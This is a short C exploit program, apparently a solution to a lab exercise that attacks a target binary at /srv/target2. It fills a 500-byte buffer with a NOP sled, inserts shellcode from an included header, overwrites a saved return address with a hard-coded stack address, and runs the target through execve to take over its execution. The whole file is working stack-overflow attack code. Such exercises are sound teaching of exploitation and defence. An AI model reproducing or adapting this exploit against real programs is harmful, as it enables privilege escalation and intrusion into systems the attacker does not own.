#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 

  char buf[500];
  memset(buf, 0x90, 500);
  memcpy(buf+400, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 488);
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = "400";
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}